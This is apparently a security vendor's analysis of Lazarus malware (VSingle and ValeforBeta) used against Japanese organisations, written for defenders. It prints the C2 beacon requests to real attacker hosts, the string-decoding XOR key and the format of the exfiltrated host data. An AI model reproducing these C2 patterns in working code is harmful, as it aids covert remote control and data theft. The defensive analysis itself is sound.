The attack group Lazarus (also known as Hidden Cobra) conducts various attack operations.
This article introduces malware (VSingle and ValeforBeta) and tools used in attacks against
Japanese organisations.

VSingle overview
VSingle is a HTTP bot which executes arbitrary code from a remote network. It also
downloads and executes plugins.
Once launched, this malware runs Explorer and executes its main code through DLL
injection. (Some samples do not perform DLL injection.) The main code contains the
following PDB path:
G:\Valefor\Valefor_Single\Release\VSingle.pdb

The next sections describe VSingle's obfuscation technique and communication format.

VSingle obfuscation technique
Most of the strings in VSingle are obfuscated. Figure 1 shows the code to disable
obfuscation. A fixed key value (o2pq0qy4ymcrbe4s) decodes the strings by XOR.

VSingle communication with C2 servers
Below is the HTTP GET request that VSingle sends to its C2 server at the beginning of the
communication.

2/13

GET /polo/[Unix time]/[random string].php?ufw=[Base64 data]&uis=[unique ID] HTTP/1.1
Host: maturicafe.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5)
Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)
Accept: text/html3,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 300
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

[Base64 data] contains the Base64-encoded value of "[IP address]|[Windows version
number]|[version]". As a response to this request, AES-encrypted data including commands
is downloaded from the server. The encryption key is specified in Set-Cookie header in the
response.
VSingle also works with authentication proxy (Basic authentication). If the malware contains
proxy settings, it can communicate in proxy environment as follows:
GET https://maturicafe.com/polo/[Unix time]/[random string].php?ufw=[Base64
data]&uis=[unique ID] HTTP/1.1
Host: maturicafe.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5)
Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)
Proxy-Connection: keep-alive
Proxy-Authorization: Basic [credential]
Pragma: no-cache
Cache-Control: no-cache

VSingle functions
VSingle has 8 simple functions as listed below:

It executes the following 4 types of plugins:
Windows PE file (saved as a .tmp file)
VBS file (saved as a .vbs file)
BAT file (saved as a .bat file)
Shellcode
Figure 2 shows a part of the code to execute a plugin.

Figure 2: Part of

VSingle code to execute a plugin
Plugins are temporarily saved in %TEMP% folder and then executed except for the
shellcode ones; They are saved in %TEMP% folder but loaded and executed on memory.
When the command number 6 (sending malware information) is selected, the data in Figure
3 is sent. As for the version number, 4.1.1, 3.0.1 and others have been confirmed in addition
to 1.0.1. It is possible that this number indicates some sort of identifier, rather than its
malware version.

ValeforBeta overview
ValeforBeta is a HTTP bot developed in Delphi, and its functions are even simpler than those
of VSingle. Besides arbitrary code execution from remote network, it just uploads and
downloads files.
The next sections describe ValeforBeta's configuration and communication format.

ValeforBeta configuration
Figure 4 shows the code to load the configuration. It contains sample ID ("512" in Figure 4),
access type and intervals, as well as C2 server information.

5/13

Figure 4: ValeforBeta

configuration
There are 3 different access types:
Connect directly (INTERNET_OPEN_TYPE_DIRECT)
Use default setting (INTERNET_OPEN_TYPE_PRECONFIG)
Connect via proxy (INTERNET_OPEN_TYPE_PROXY)

ValeforBeta communication with C2 servers
Below is the HTTP POST request that ValeforBeta sends to its C2 server at the beginning of
the communication.

6/13

POST /doc/total.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=[Base64 data]
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0;
SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC
6.0; InfoPath.3)
Host: 3.90.97.16
Content-Length: 0
Proxy-Connection: Keep-Alive
Pragma: no-cache

Although it is a HTTP POST request, it does not contain any data to send. The Base64encoded data after "JSESSIONID=" in the Cookie header contains the information of an
infected host. Below is the format of Base64-encoded data.
[8-letter random string][data][random string (4-12 letters)]

[data] contains the version information of the malware and the IP address of the infected
hosts. (See request type "0" in Appendix A for more details.) If the response from the server
is "200 OK", the next request is sent (Request type "1").
The C2 server sends data including commands. The result of the command execution is sent
as a part of the HTTP POST request, disguised as a BMP file. Figure 5 shows part of the
code to send the command execution result.

Tools used after intrusion
The attackers use the following 3 tools in this operation in order to relay communication with
C2 server.
3Proxy
Stunnel
Plink

9/13

We introduced malware and tools that Lazarus used in the operation against Japanese
organisations. We will provide an update if we find new types of malware.
The C2 servers connected to the samples described in this article are listed in Appendix B.
Please make sure that none of your devices is communicating with them.
